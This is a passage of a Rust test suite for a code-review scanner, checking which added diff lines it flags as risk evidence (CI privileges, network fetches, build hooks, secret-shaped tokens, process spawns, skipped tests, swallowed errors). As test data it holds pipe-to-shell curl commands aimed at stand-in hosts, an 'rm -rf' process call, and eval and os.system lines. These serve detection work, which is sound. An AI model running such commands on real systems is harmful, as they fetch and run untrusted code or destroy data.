                assert!(of_whole.contains(item), "{item:?} of hunk {index}:\n{text}");
            }
            more += usize::from(of_file.len() > alone.len());
            let labels = distinct(&of_file);
            assert_eq!(
                in_order.of(index),
                labels,
                "in order, hunk {index}:\n{text}"
            );
            assert_eq!(HunkLabels::new(file).of(index), labels, "one hunk:\n{text}");
            let answered = hunk_signals_alone(file, index, &FileKinds::of(file)).unwrap();
            for signal in distinct(&alone) {
                assert!(answered.contains(&signal), "alone:\n{text}");
            }
        }
        let mut backwards = HunkLabels::new(file);
        for index in (0..hunks.len()).rev() {
            let labels = distinct(&of_file(&hunks[index]));
            assert_eq!(backwards.of(index), labels, "backwards:\n{text}");
        }
        // In any order, a hunk more than once: three asks for each hunk, drawn at random, of
        // a reader that was told the order (it keeps the labels) and of one that was not (it
        // goes through the file again when asked for a hunk behind it).
        let mut seed = 0x9E37_79B9_7F4A_7C15_u64 ^ (text.len() as u64);
        let order: Vec<usize> = (0..3 * hunks.len())
            .map(|_| {
                seed ^= seed << 13;
                seed ^= seed >> 7;
                seed ^= seed << 17;
                usize::try_from(seed % (hunks.len() as u64)).unwrap()
            })
            .collect();
        let mut named = HunkLabels::naming(file, &order);
        let mut unnamed = HunkLabels::new(file);
        for &index in &order {
            let labels = distinct(&of_file(&hunks[index]));
            assert_eq!(named.of(index), labels, "named, hunk {index}:\n{text}");
            assert_eq!(
                unnamed.of(index),
                labels,
                "any order, hunk {index}:\n{text}"
            );
            assert!(named.entries_kept() <= hunks.len() + 1, "{text}");
        }
        more
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// S3.18: to YAML `contents: 'write'` is `contents: write`. Releases 0.8.3 to 0.9.0 found
    /// only the plain spelling of a key-value grant. Each token of the table that is a key and
    /// a value, in each form a formatter or an agent may write, is a privilege; the same text
    /// with another value, in a comment, with more after the value, or outside a workflow is
    /// not.
    #[test]
    fn a_privilege_in_quotes_or_spaced_is_a_privilege() {
        let rule = RULES.iter().find(|r| r.signal == S::CiPrivilege).unwrap();
        let Match::Tokens(tokens) = rule.matches else {
            panic!("ci_privilege reads tokens")
        };
        let pairs: Vec<(&str, &str)> = tokens.iter().filter_map(|t| t.split_once(": ")).collect();
        assert_eq!(pairs.len(), 5, "{tokens:?}");
        let ci = ".github/workflows/ci.yml";
        for (k, v) in pairs {
            for (form, line) in [
                ("value in single quotes", format!("  {k}: '{v}'")),
                ("value in double quotes", format!("  {k}: \"{v}\"")),
                ("key in single quotes", format!("  '{k}': {v}")),
                ("key in double quotes", format!("  \"{k}\": {v}")),
                ("both in single quotes", format!("  '{k}': '{v}'")),
                ("both in double quotes", format!("  \"{k}\": \"{v}\"")),
                (
                    "flow mapping, value quoted",
                    format!("  permissions: {{{k}: '{v}'}}"),
                ),
                (
                    "flow mapping, JSON",
                    format!("  permissions: {{\"{k}\":\"{v}\"}}"),
                ),
                ("a space before the colon", format!("  {k} : {v}")),
                ("two spaces after the colon", format!("  {k}:  {v}")),
                ("a tab after the colon", format!("  {k}:\t{v}")),
                ("quoted, then a comment", format!("  {k}: '{v}'  # why")),
            ] {
                let file = added(ci, &[&line]);
                assert_eq!(signals(&file), [S::CiPrivilege], "{form}: {line}");
                // Found only by the further reading, so release 0.8.3 did not report it.
                assert_eq!(file_evidence_released(&file), [false], "{form}: {line}");
            }
            let other = if v == "write" { "read" } else { "none" };
            for (form, path, line) in [
                ("another value", ci, format!("  {k}: '{other}'")),
                ("another value", ci, format!("  \"{k}\": \"{other}\"")),
                ("in a comment", ci, format!("  # {k}: '{v}'")),
                ("in a comment", ci, format!("  x: 1 # \"{k}\": \"{v}\"")),
                ("more after the value", ci, format!("  {k}: '{v}x'")),
                ("more after the quote", ci, format!("  {k}: '{v}'x")),
                ("an escape in it", ci, format!("  {k}: \"{v}\\\"\"")),
                ("not a workflow", "deploy/app.yml", format!("  {k}: '{v}'")),
            ] {
                assert_eq!(signals(&added(path, &[&line])), [], "{form}: {line}");
            }
            // The plain spellings are what release 0.8.3 reported, and are still marked so.
            for line in [
                format!("  {k}: {v}"),
                format!("  permissions: {{{k}: {v}}}"),
            ] {
                let file = added(ci, &[&line]);
                assert_eq!(file_evidence_released(&file), [true], "{line}");
            }
        }
    }

    /// S3.18, the forms each rule that reads a YAML or JSON file finds, quoted or not, held
    /// so that a later change of one of these rules cannot lose one unseen; and the forms that
    /// are stated limits (README), held as not found so that the statement stays true.
    #[test]
    fn every_rule_that_reads_yaml_or_json_reads_its_forms() {
        let (ci, yml, pkg) = (".github/workflows/ci.yml", "deploy/app.yml", "package.json");
        let secret = format!("ghp_{}", "A".repeat(36));
        let cases: &[(&str, String, &[S])] = &[
            (ci, "on: 'pull_request_target'".into(), &[S::CiPrivilege]),
            (
                ci,
                "on: [\"push\", \"pull_request_target\"]".into(),
                &[S::CiPrivilege],
            ),
            (ci, "  'pull_request_target':".into(), &[S::CiPrivilege]),
            (ci, "permissions: \"write-all\"".into(), &[S::CiPrivilege]),
            (ci, "permissions : write-all".into(), &[S::CiPrivilege]),
            (
                yml,
                "  run: 'curl -fsS https://x'".into(),
                &[S::NetworkFetch],
            ),
            (yml, "  args: ['wget', '-q']".into(), &[S::NetworkFetch]),
            (
                ci,
                "  - {run: \"wget https://x\"}".into(),
                &[S::NetworkFetch],
            ),
            (
                pkg,
                "    \"postinstall\" : \"node x.js\",".into(),
                &[S::BuildHook],
            ),
            (
                pkg,
                "  \"scripts\": {\"prepare\":\"node x.js\"},".into(),
                &[S::BuildHook],
            ),
            (yml, format!("  token: '{secret}'"), &[S::SecretLike]),
            (pkg, format!("  \"token\": \"{secret}\","), &[S::SecretLike]),
            // stated limits: escapes, tags, block scalars, explicit keys; JSON5 in package.json
            (ci, "  contents: \"\\x77rite\"".into(), &[]),
            (ci, "  contents: !!str write".into(), &[]),
            (ci, "  ? contents".into(), &[]),
            (pkg, "    \"\\u0069nstall\": \"node x.js\",".into(), &[]),
            (pkg, "    'install': 'node x.js',".into(), &[]),
        ];
        for (path, line, expected) in cases {
            assert_eq!(signals(&added(path, &[line])), *expected, "{path}: {line}");
        }
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    /// Batteries, phase 1: the ways a change makes a test stop testing, and unfinished work
    /// presented as done. Each is read as code on an added line.
    #[test]
    fn a_skipped_test_a_trivial_assert_and_a_stub_are_evidence() {
        let cases: &[(&str, &str, EvidenceSignal)] = &[
            ("tests/a.rs", "#[ignore]", S::TestSkipped),
            ("tests/a.rs", "#[ignore = \"slow\"]", S::TestSkipped),
            (
                "test_a.py",
                "@pytest.mark.skip(reason=\"later\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "@pytest.mark.skipif(sys.platform == \"win32\")",
                S::TestSkipped,
            ),
            ("test_a.py", "@pytest.mark.xfail", S::TestSkipped),
            ("test_a.py", "    pytest.skip(\"later\")", S::TestSkipped),
            (
                "test_a.py",
                "@unittest.skipUnless(HAVE, \"x\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "        self.skipTest(\"later\")",
                S::TestSkipped,
            ),
            ("a.test.ts", "it.skip(\"adds\", () => {});", S::TestSkipped),
            (
                "a.test.ts",
                "describe.skip(\"suite\", () => {});",
                S::TestSkipped,
            ),
            ("a.test.ts", "test.todo(\"adds\");", S::TestSkipped),
            ("a.test.ts", "xit(\"adds\", () => {});", S::TestSkipped),
            ("a_test.go", "\tt.Skip(\"later\")", S::TestSkipped),
            ("a_test.go", "\tt.SkipNow()", S::TestSkipped),
            ("tests/a.rs", "    assert!(true);", S::TrivialAssert),
            (
                "tests/a.rs",
                "    assert_eq!(true, true);",
                S::TrivialAssert,
            ),
            ("test_a.py", "    assert True", S::TrivialAssert),
            (
                "test_a.py",
                "        self.assertTrue(True)",
                S::TrivialAssert,
            ),
            ("a.test.ts", "  expect(true).toBe(true);", S::TrivialAssert),
            ("a.test.ts", "  assert.ok(true);", S::TrivialAssert),
            ("src/a.rs", "    todo!()", S::StubAdded),
            ("src/a.rs", "    unimplemented!(\"later\")", S::StubAdded),
            ("a.py", "    raise NotImplementedError", S::StubAdded),
            (
                "a.py",
                "    raise NotImplementedError(\"later\")",
                S::StubAdded,
            ),
        ];
        for (path, line, signal) in cases {
            assert_eq!(signals(&added(path, &[line])), [*signal], "{path}: {line}");
        }
    }

    /// The same words where they are not that code: no evidence.
    #[test]
    fn near_misses_of_the_integrity_tokens_are_not_evidence() {
        let cases: &[(&str, &str)] = &[
            (
                "tests/a.rs",
                "// #[ignore] was here; assert!(true) and todo!() too",
            ),
            ("tests/a.rs", "let s = \"#[ignore] assert!(true) todo!()\";"),
            ("tests/a.rs", "#[ignored_by_default]"),
            ("tests/a.rs", "    assert!(true_enough(x));"),
            ("tests/a.rs", "    debug_assert!(truer);"),
            ("src/a.rs", "    my_todo!(x)"),
            (
                "test_a.py",
                "# pytest.mark.skip, assert True, raise NotImplementedError",
            ),
            ("test_a.py", "x = \"pytest.skip(\""),
            ("test_a.py", "    assert True_value"),
            ("test_a.py", "    assert Trueish is None"),
            ("a.py", "    raise NotImplementedErrorSubclass()"),
            ("a.py", "    x.raise_NotImplementedError()"),
            ("a.test.ts", "exit(code);"),
            ("a.test.ts", "submit.skip(1);"),
            ("a.test.ts", "console.assert(true);"),
            ("a.test.ts", "// it.skip(\"x\")"),
            ("a_test.go", "\tctx.t.Skip(\"x\")"),
            ("a_test.go", "\tit.Skip(\"x\")"),
            // the tokens of another language are not this file's
            ("a.go", "\ttodo!()"),
            ("a.ts", "#[ignore]"),
        ];
        for (path, line) in cases {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// A file from hunk body lines written as in a patch (`+`, `-` or a space first), after one
    /// context line `x`.
    fn hunk_of(path: &str, body: &[&str]) -> ReviewFile {
        let old = 1 + body.iter().filter(|l| !l.starts_with('+')).count();
        let new = 1 + body.iter().filter(|l| !l.starts_with('-')).count();
        let mut text = format!("--- a/{path}\n+++ b/{path}\n@@ -1,{old} +1,{new} @@\n x\n");
        for line in body {
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    /// A hunk that is the beginning of a new file: `body` lines without their `+`.
    fn new_file(path: &str, body: &[&str]) -> ReviewFile {
        let mut text = format!(
            "diff --git a/{path} b/{path}\nnew file mode 100644\n--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{} @@\n",
            body.len()
        );
        for line in body {
            text.push('+');
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    /// One item as the tests name it: its signal, its basis and its line.
    type Item = (EvidenceSignal, Basis, u32);

    fn found(file: &ReviewFile) -> Vec<Item> {
        file_evidence(file)
            .iter()
            .map(|e| (e.signal, e.basis, e.line))
            .collect()
    }

    /// Batteries, slice 2: a handler and its empty body are read together, on the line that
    /// opens the handler, and say that they were (`hunk`).
    #[test]
    fn an_error_handler_with_nothing_in_it_is_evidence_read_across_two_lines() {
        let swallowed = [(S::ErrorSwallowed, Basis::Hunk, 2)];
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    pass"]),
            (
                "a.py",
                &["+    except (KeyError, OSError) as e:", "+        ..."],
            ),
            ("a.py", &["+except Exception: pass"]),
            (
                "a.py",
                &["+except:  # nothing to do", "+    pass  # really"],
            ),
            ("a.ts", &["+} catch (e) {}"]),
            ("a.ts", &["+} catch { }"]),
            ("a.ts", &["+} catch (err) {", "+}"]),
            ("a.ts", &["+try { f(); } catch ({ message }) {", "+}"]),
            ("a.go", &["+\tif err != nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil {}"]),
            ("a.go", &["+\tif err := f(); err != nil {", "+\t}"]),
            // the body is the next line of the new file: a removed line between is not it,
            // and an unchanged line is
            (
                "a.py",
                &["+except ValueError:", "-    handle()", "+    pass"],
            ),
            ("a.py", &["+except ValueError:", "     pass"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), swallowed, "{path}: {body:?}");
        }
    }

    /// An arm or an assignment that drops the error on one line is found by its token.
    #[test]
    fn an_error_dropped_on_one_line_is_lexical_evidence() {
        for (path, line) in [
            ("src/a.rs", "        Err(_) => {}"),
            ("src/a.rs", "        Err(_) => (),"),
            ("a.go", "\t_ = err"),
        ] {
            assert_eq!(
                found(&added(path, &[line])),
                [(S::ErrorSwallowed, Basis::Lexical, 2)],
                "{path}: {line}"
            );
        }
    }

    /// A handler that does something, one whose body the hunk does not show, and the same
    /// words elsewhere: no evidence.
    #[test]
    fn a_handler_that_handles_or_whose_body_is_unseen_is_not_evidence() {
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    log(e)"]),
            ("a.py", &["+except ValueError:"]),
            ("a.py", &["+except ValueError:", "-    pass"]),
            ("a.py", &["+except ValueError: return None"]),
            ("a.py", &["+exceptional = 1", "+pass"]),
            ("a.py", &["+# except ValueError: pass"]),
            ("a.py", &["+s = \"except ValueError: pass\""]),
            ("a.py", &["+else:", "+    pass"]),
            ("a.ts", &["+} catch (e) { log(e); }"]),
            ("a.ts", &["+} catch (e) {", "+  log(e);"]),
            ("a.ts", &["+} catch (e) {"]),
            // a promise handler that does something (an empty one is evidence since review V3
            // round 1; before, no `.catch(…)` was read at all)
            ("a.ts", &["+p.catch((e) => { log(e); });"]),
            ("a.ts", &["+const catcher = {};"]),
            ("a.ts", &["+// } catch (e) {}"]),
            ("a.go", &["+\tif err != nil {", "+\t\treturn err"]),
            ("a.go", &["+\tif err == nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil && retry {", "+\t}"]),
            ("a.go", &["+\tfor err != nil {", "+\t}"]),
            ("a.go", &["+\t_ = errors.New(\"x\")"]),
            ("src/a.rs", &["+        Err(e) => {}"]),
            ("src/a.rs", &["+        Err(_) => { log(); }"]),
            // another language's form
            ("a.go", &["+except ValueError:", "+    pass"]),
            ("a.py", &["+} catch (e) {}"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), [], "{path}: {body:?}");
        }
    }

    /// A removed empty handler is the repair, and reading neighbours changes nothing a token
    /// rule finds: the same line, the same signals, the first rung.
    #[test]
    fn the_neighbour_reading_rule_leaves_token_evidence_as_it_was() {
        assert_eq!(
            found(&hunk_of("a.py", &["-except ValueError:", "-    pass"])),
            []
        );
        let file = hunk_of(
            "a.py",
            &["+import subprocess", "+subprocess.run(x)", "+eval(y)"],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 3),
                (S::DynamicEval, Basis::Lexical, 4),
            ]
        );
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert!(Basis::Hunk > Basis::Lexical);
    }

    /// The integrity signals of a Rust hunk are read from its tokens, whatever the spelling
    /// and the lines. (Until 2026-11-14 a parser confirmed each of these, and the item said
    /// `syntax_fragment`; that value is gone with the parser.)
    #[test]
    fn the_tokens_of_a_hunk_give_rust_constructs_whatever_their_spelling() {
        let cases: &[(&str, &[&str], EvidenceSignal)] = &[
            (
                "src/a.rs",
                &["+    let v = f().unwrap();"],
                S::PanicPathAdded,
            ),
            (
                "src/a.rs",
                &["+    let v = f()", "+        .expect(\"set\");"],
                S::PanicPathAdded,
            ),
            ("tests/a.rs", &["+    assert!( true );"], S::TrivialAssert),
            (
                "tests/a.rs",
                &["+    assert!(true, \"always\");"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+    assert_eq!(true , true);"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+#[cfg_attr(miri, ignore)]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            (
                "tests/a.rs",
                &["+#[ignore]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            ("src/a.rs", &["+    todo!( )"], S::StubAdded),
            // the hunk closes a block it did not open, and opens one it does not close
            (
                "src/a.rs",
                &[
                    "     y",
                    " }",
                    "+fn b() {",
                    "+    if c {",
                    "+        h().unwrap();",
                ],
                S::PanicPathAdded,
            ),
        ];
        for (path, body, signal) in cases {
            let items = found(&hunk_of(path, body));
            assert_eq!(items.len(), 1, "{path}: {body:?}: {items:?}");
            assert_eq!(
                (items[0].0, items[0].1),
                (*signal, Basis::Lexical),
                "{path}: {body:?}"
            );
        }
        // the same constructs with their tokens on several lines say `hunk`
        let over_lines: &[(&[&str], EvidenceSignal, u32)] = &[
            (
                &["+    let v = f()", "+        .", "+        unwrap();"],
                S::PanicPathAdded,
                3,
            ),
            (
                &["+    assert!(", "+        true", "+    );"],
                S::TrivialAssert,
                2,
            ),
            (
                &["+#[cfg_attr(", "+    miri,", "+    ignore", "+)]"],
                S::TestSkipped,
                2,
            ),
            (&["+#[", "+    ignore]"], S::TestSkipped, 2),
            (&["+    todo", "+    !()"], S::StubAdded, 2),
        ];
        for (body, signal, line) in over_lines {
            assert_eq!(
                found(&hunk_of("tests/a.rs", body)),
                [(*signal, Basis::Hunk, *line)],
                "{body:?}"
            );
        }
    }

    /// The decision of 2026-11-14 (D1): nothing removes evidence. A panic path under an exact
    /// `#[cfg(test)]`, first attribute of a top-level item of a file the patch creates whole,
    /// used to be withdrawn as proved test code. The second independent review compiled four
    /// files that met every condition and panicked in production code (IR2-H-1 to IR2-H-4).
    /// Now each such item stands, at the same score as anywhere, and says `test_likely`.
    /// Before, each of these three files gave no evidence.
    #[test]
    fn a_panic_path_under_cfg_test_in_a_new_file_stands_and_is_marked_test_likely() {
        let marks = |body: &[&str]| -> Vec<(EvidenceSignal, Basis, u32, bool)> {
            file_evidence(&new_file("src/a.rs", body))
                .iter()
                .map(|e| (e.signal, e.basis, e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            marks(&[
                "pub fn real() {}",
                "",
                "#[cfg(test)]",
                "mod checks {",
                "    use super::*;",
                "    #[test]",
                "    fn a() {",
                "        assert_eq!(parse(\"x\").unwrap(), 1);",
                "        f().expect(\"set\");",
                "    }",
                "}",
            ]),
            [
                (S::PanicPathAdded, Basis::Lexical, 8, true),
                (S::PanicPathAdded, Basis::Lexical, 9, true),
            ]
        );
        assert_eq!(
            marks(&["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"]),
            [(S::PanicPathAdded, Basis::Lexical, 3, true)]
        );
        assert_eq!(
            marks(&[
                "/// For tests.",
                "#[cfg(test)]",
                "#[inline]",
                "impl Thing {",
                "    fn make() -> Self { f().expect(\"x\") }",
                "}",
            ]),
            [(S::PanicPathAdded, Basis::Lexical, 5, true)]
        );
        // the mark changes no score: the same file without the attribute scores the same
        let score = |body: &[&str]| crate::risk::score_file(&new_file("src/a.rs", body)).0;
        assert_eq!(
            score(&["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"]),
            score(&["#[inline]", "fn helper() {", "    f().unwrap();", "}"])
        );
    }

    /// Review V3 round 4, VD3R4-H-1. A hunk of an existing file that says it starts at line 1
    /// is not the beginning of the file: the header is the patch writer's word, and `git apply
    /// --unidiff-zero` or `-C0` applies the hunk further down, under a comment opened above
    /// it. Before, this production panic path was withdrawn. Since 2026-11-14 nothing is
    /// withdrawn anywhere, and these stay as cases that must keep their item.
    #[test]
    fn a_hunk_that_only_says_it_starts_the_file_keeps_its_panic_path() {
        let forged = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,4 +1,4 @@\n #[cfg(test)] // */\n fn production() {\n-    safe();\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&forged), [(S::PanicPathAdded, Basis::Lexical, 3)]);
        // every line added and line 1 claimed, but the file is not new
        let inserted = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&inserted), [(S::PanicPathAdded, Basis::Lexical, 3)]);
        // a new file in two hunks: neither is the whole file
        let two = parse(
            "diff --git a/src/a.rs b/src/a.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n@@ -0,0 +5,1 @@\n+fn more() {}\n",
        );
        if let Ok(mut files) = two {
            let file = files.remove(0);
            assert!(
                found(&file).iter().any(|item| item.0 == S::PanicPathAdded),
                "a new file in two hunks was believed"
            );
        }
    }

    /// The owner's decision of 2026-11-14, on the reviewer's suggestion: a panic path that the
    /// hunk shows under a test attribute is not withdrawn (no test attribute is proof) and is
    /// not scored differently (a hint must not weaken a judge); it is marked, so that a reader
    /// can tell it from the same call in code that shows no sign of being a test.
    #[test]
    fn a_panic_path_under_a_test_attribute_stands_and_is_marked_test_likely() {
        let marks = |file: &ReviewFile| -> Vec<(EvidenceSignal, u32, bool)> {
            file_evidence(file)
                .iter()
                .map(|e| (e.signal, e.line, e.test_likely))
                .collect()
        };
        // in a change to an existing file, with one call inside another macro's arguments
        let test = hunk_of(
            "src/a.rs",
            &[
                "+#[test]",
                "+fn a() {",
                "+    f().unwrap();",
                "+    assert_eq!(g().unwrap(), 1);",
                "+}",
            ],
        );
        assert_eq!(
            marks(&test),
            [(S::PanicPathAdded, 4, true), (S::PanicPathAdded, 5, true)]
        );
        for attribute in ["+#[tokio::test]", "+#[rstest]", "+#[cfg(test)]"] {
            let file = hunk_of(
                "src/a.rs",
                &[attribute, "+fn a() {", "+    f().unwrap();", "+}"],
            );
            assert_eq!(marks(&file), [(S::PanicPathAdded, 4, true)], "{attribute}");
        }
        // code that shows no sign of being a test, and the function after a test
        let plain = hunk_of(
            "src/a.rs",
            &[
                "+#[test]",
                "+fn a() {}",
                "+fn real() {",
                "+    f().unwrap();",
                "+}",
            ],
        );
        assert_eq!(marks(&plain), [(S::PanicPathAdded, 5, false)]);
        // Review V3 round 7, VD3R7-L-1: a production function on the same line as a test, and
